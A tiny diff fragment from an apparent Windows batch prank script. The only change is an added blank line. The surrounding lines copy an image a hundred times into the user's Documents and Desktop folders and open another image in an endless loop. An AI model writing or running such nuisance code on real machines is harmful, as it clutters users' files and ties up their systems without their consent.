@@ -11,6 +11,7 @@ FOR /L %%A IN (1,1,100) DO (
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Documents\hehe"%%A""%rmcomma%".jpg*	
 	Xcopy /Y /I .\hehe.jpg %HOMEPATH%\Desktop\hehe"%%A""%rmcomma%".jpg*
 )
+
 :Hehe
 hehe.png
 goto Hehe
